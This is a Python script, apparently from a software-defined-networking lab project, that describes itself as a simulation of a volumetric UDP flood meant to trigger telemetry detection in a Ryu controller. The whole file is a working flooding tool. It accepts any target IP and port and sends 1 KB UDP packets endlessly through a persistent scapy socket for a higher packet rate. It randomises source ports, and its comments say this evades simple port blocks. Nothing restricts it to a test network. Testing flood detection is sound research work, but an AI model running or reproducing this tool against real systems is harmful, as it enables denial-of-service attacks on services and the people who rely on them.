#!/usr/bin/env python3
"""
DDoS Attack Simulation Script

Data Plane / Traffic Generation Component

This script simulates a volumetric UDP flood attack originating from a Mininet host.
It uses scapy to generate packets with randomized source ports to mimic complex
botnet behavior, triggering the telemetry detection of the Ryu controller.
"""

import argparse
import random
import time
from scapy.all import IP, UDP, Raw

def main():
    parser = argparse.ArgumentParser(description="Volumetric UDP Flood DDoS Simulation")
    parser.add_argument("--target", required=True, help="Target IP address (Victim)")
    parser.add_argument("--port", type=int, default=80, help="Target destination port (default: 80)")
    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    
    print(f"[*] Starting UDP flood attack against {target_ip}:{target_port}")
    print("[*] Press Ctrl+C to stop.")

    import socket
    def get_local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target_ip, 1))
            return s.getsockname()[0]
        except Exception:
            return '127.0.0.1'
        finally:
            s.close()
            
    src_ip = get_local_ip()
    print(f"[*] Source IP resolved as: {src_ip}")

    # Payload for the UDP packets to add some volume
    payload = b"X" * 1024  # 1KB payload

    packet_count = 0
    start_time = time.time()

    # Open a persistent Layer 3 socket to drastically increase PPS
    # by avoiding the overhead of opening/closing a socket per packet.
    from scapy.all import conf
    sock = conf.L3socket()

    try:
        while True:
            # Randomize source port for every packet to simulate botnet behavior
            # and bypass simple stateless port blocks.
            src_port = random.randint(1024, 65535)

            # Construct the packet
            packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / Raw(load=payload)

            # Send the packet via the persistent socket
            sock.send(packet)
            
            packet_count += 1

            # Print status every 1000 packets
            if packet_count % 1000 == 0:
                elapsed_time = time.time() - start_time
                pps = packet_count / elapsed_time
                print(f"[+] Sent {packet_count} packets to {target_ip}:{target_port} (Rate: {pps:.2f} pps)")

    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped. Total packets sent: {packet_count}")

if __name__ == "__main__":
    main()
